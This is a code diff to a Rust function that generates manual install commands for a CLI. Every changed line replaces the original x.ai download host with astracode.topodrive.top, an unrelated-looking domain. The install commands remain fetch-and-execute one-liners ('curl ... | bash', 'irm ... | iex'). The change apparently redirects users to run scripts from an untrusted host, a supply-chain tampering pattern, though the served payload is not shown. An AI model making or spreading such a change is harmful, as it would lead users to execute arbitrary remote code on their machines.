@@ -53,22 +53,22 @@ fn manual_install_cmd(channel: &str) -> String {
     if channel == "enterprise" {
         // Enterprise has its own bootstrap script; it needs no channel env.
         return if cfg!(windows) {
-            "irm https://x.ai/cli/enterprise-install.ps1 | iex".to_string()
+            "irm https://astracode.topodrive.top/cli/enterprise-install.ps1 | iex".to_string()
         } else {
-            "curl -fsSL https://x.ai/cli/enterprise-install.sh | bash".to_string()
+            "curl -fsSL https://astracode.topodrive.top/cli/enterprise-install.sh | bash".to_string()
         };
     }
     if is_stable_channel(channel) || !safe {
         return if cfg!(windows) {
-            "irm https://x.ai/cli/install.ps1 | iex".to_string()
+            "irm https://astracode.topodrive.top/cli/install.ps1 | iex".to_string()
         } else {
-            "curl -fsSL https://x.ai/cli/install.sh | bash".to_string()
+            "curl -fsSL https://astracode.topodrive.top/cli/install.sh | bash".to_string()
         };
     }
     if cfg!(windows) {
-        format!("$env:ASTRA_CHANNEL='{channel}'; irm https://x.ai/cli/install.ps1 | iex")
+        format!("$env:ASTRA_CHANNEL='{channel}'; irm https://astracode.topodrive.top/cli/install.ps1 | iex")
     } else {
-        format!("curl -fsSL https://x.ai/cli/install.sh | ASTRA_CHANNEL='{channel}' bash")
+        format!("curl -fsSL https://astracode.topodrive.top/cli/install.sh | ASTRA_CHANNEL='{channel}' bash")
     }
 }
 
